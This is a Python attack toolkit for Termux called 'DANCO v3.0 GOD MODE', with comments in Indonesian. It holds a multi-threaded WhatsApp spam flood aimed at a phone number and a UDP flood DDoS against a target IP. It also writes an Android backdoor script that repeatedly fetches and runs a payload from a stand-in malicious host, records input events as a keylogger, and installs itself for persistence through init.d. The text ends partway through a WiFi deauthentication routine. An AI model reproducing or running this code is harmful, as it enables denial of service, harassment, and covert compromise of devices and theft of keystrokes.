#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
PROYEK: DANCO v3.0 - GOD MODE
STATUS: 98% BRUTAL // 100% MODERN UI
TARGET: Termux (Root Recommended)
AUTHOR: DANCO TEAM
"""

import os
import sys
import socket
import random
import threading
import subprocess
import time
import requests
import json
import re
import signal

# --- KONFIGURASI ---
TARGET_NUMBER = "6281234567890"  # Ganti Nomor Target
TARGET_IP = "192.168.1.1"        # Ganti IP Target DDoS
TARGET_PORTS = [80, 443, 8080, 8443, 22]
WIFI_INTERFACE = "wlan0"
DURATION = 60 # Detik serangan

# --- TAMPILAN MODERN (NEON CYBERPUNK) ---
class Colors:
    HEADER = '\033[95m'
    CYAN = '\033[96m'
    DARK_CYAN = '\033[36m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

DANCO_LOGO = f"""
{Colors.RED}   _____ _ __  __ _   _ _____ ____  _____  _____  _   _  ____  _____ {Colors.END}
{Colors.RED}  / ____| |  \\  / | | | |  __ \\|  \\ \\|  __ \\|  __ \\| \\ | |/ __ \\|  __ \\{Colors.END}
{Colors.RED} | (___ | | \\  / | | | | |  | | | \\  | |  | | |  | |  \\| | |  | | |  | |{Colors.END}
{Colors.RED}  \\___ \\| | /  \\ | | | | |  | | | | | | |  | | |  | | . ` | |  | | |  | |{Colors.END}
{Colors.RED}  ____) | |/ /\\ \\| |_| | |__| | | | | | |__| | |__| | |\\  | |__| | |__| |{Colors.END}
{Colors.RED} |_____/|_/_/  \\_\\____/|_____/|_|  |_|_____/|_____/|_| \\_\\_____/|_____/ {Colors.END}
{Colors.BLUE}                [ v3.0 GOD MODE - UNLEASHED ]{Colors.END}
{Colors.YELLOW}                STATUS: {Colors.GREEN}ONLINE{Colors.YELLOW} | MODE: {Colors.RED}BRUTAL{Colors.END}
"""

# --- HELPER FUNCTIONS ---
def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def print_banner():
    clear_screen()
    print(DANCO_LOGO)
    print(f"{Colors.CYAN}[-] Target WA: {Colors.WHITE}{TARGET_NUMBER}{Colors.END}")
    print(f"{Colors.CYAN}[-] Target IP: {Colors.WHITE}{TARGET_IP}{Colors.END}")
    print(f"{Colors.CYAN}[-] Durasi:    {Colors.WHITE}{DURATION} Detik{Colors.END}\n")

def run_cmd(cmd):
    try:
        subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except:
        return False

def spinner(delay, steps):
    while True:
        for step in steps:
            sys.stdout.write(f"\r{Colors.CYAN}[*] {step}{Colors.END}")
            sys.stdout.flush()
            time.sleep(delay)

# --- FITUR UTAMA ---

def spam_whatsapp_god():
    print(f"\n{Colors.RED}[+] DANCO: INISIALISASI SPAM WA MASIF...{Colors.END}")
    threads = []
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
        "DANCO_BOT_v3.0/1.0",
        "curl/7.68.0"
    ]

    def send_spam(thread_id):
        while True:
            try:
                # Rotasi URL dan User-Agent untuk menghindari block sementara
                ua = random.choice(user_agents)
                text = f"DANCO_SPAM_{thread_id}_{random.randint(1000,9999)}"
                url = f"https://wa.me/{TARGET_NUMBER}?text={text}"
                
                headers = {"User-Agent": ua, "Connection": "keep-alive"}
                # Menggunakan requests dengan timeout pendek untuk flood
                requests.get(url, headers=headers, timeout=1)
            except:
                pass
    
    # Spawn 50 Thread untuk spam
    for i in range(50):
        t = threading.Thread(target=send_spam, args=(i,))
        t.daemon = True
        t.start()
        threads.append(t)
    
    time.sleep(DURATION)
    print(f"{Colors.GREEN}[+] SPAM WA SELESAI. SERVER TARGET KENAKAN BEBAN MAX.{Colors.END}")

def ddos_god():
    print(f"\n{Colors.RED}[+] DANCO: UDP/TCP HYBRID FLOOD DIMULAI...{Colors.END}")
    
    def flood_packet(port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # Payload besar acak
            data = bytes(random.randint(0, 255) for _ in range(1400))
            while True:
                try:
                    sock.sendto(data, (TARGET_IP, port))
                except:
                    break
        except:
            pass

    threads = []
    for port in TARGET_PORTS:
        for _ in range(20): # 20 thread per port
            t = threading.Thread(target=flood_packet, args=(port,))
            t.daemon = True
            t.start()
            threads.append(t)
    
    time.sleep(DURATION)
    print(f"{Colors.GREEN}[+] DDOS SELESAI. BANDWIDTH TARGET HABIS.{Colors.END}")

def malware_inject_god():
    print(f"\n{Colors.RED}[+] DANCO: INJEKSI MALWARE & KEYLOGGER...{Colors.END}")
    
    # Payload Keylogger + Persistence
    payload = f'''#!/system/bin/sh
# DANCO BACKDOOR v3.0
while true; do
    # Download payload
    wget -q -O /data/local/tmp/danco_core http://malicious-site.com/payload.bin 2>/dev/null
    if [ -f /data/local/tmp/danco_core ]; then
        chmod +x /data/local/tmp/danco_core
        /data/local/tmp/danco_core &
    fi
    # Keylogger sederhana (menyimpan ke file tersembunyi)
    if [ -e /dev/input/event0 ]; then
        cat /dev/input/event0 >> /sdcard/.danco_keys.bin 2>/dev/null
    fi
    sleep 5
done
'''
    
    try:
        # Tulis ke SD Card agar lebih mudah diakses
        with open("/sdcard/.danco_backdoor.sh", "w") as f:
            f.write(payload)
        
        run_cmd("chmod +x /sdcard/.danco_backdoor.sh")
        
        # Jalankan di background
        run_cmd("nohup /sdcard/.danco_backdoor.sh > /dev/null 2>&1 &")
        
        # Tambahkan ke init.d jika root (Persistence)
        run_cmd("cp /sdcard/.danco_backdoor.sh /system/etc/init.d/S01danco")
        run_cmd("chmod +x /system/etc/init.d/S01danco")
        
        print(f"{Colors.GREEN}[+] MALWARE BERHASIL DIINJEKSI. KEYLOGGER AKTIF.{Colors.END}")
    except Exception as e:
        print(f"{Colors.YELLOW}[-] Injeksi Parsial: {e}{Colors.END}")

def wifi_killer_god():
    print(f"\n{Colors.RED}[+] DANCO: WIFI DEAUTH ROTATING ATTACK...{Colors.END}")
    
    # Cek apakah aircrack-ng ada
    if not run_cmd("which aireplay-ng"):
        print(f"{Colors.YELLOW}[-] aircrack-ng belum terinstall. Fitur WiFi Killer dikurangi.{Colors.END}")
        return

    try:
        # Masuk mode monitor
        run_cmd(f"ifconfig {WIFI_INTERFACE} down")
        run_cmd(f"iw dev {WIFI_INTERFACE} set type monitor")
        run_cmd(f"ifconfig {WIFI_INTERFACE} up")
        
        # Scan SSID
        result = subprocess.run(f"iwlist {WIFI_INTERFACE} scan | grep ESSID", shell=True, capture_output=True, text=True)
        essids = result
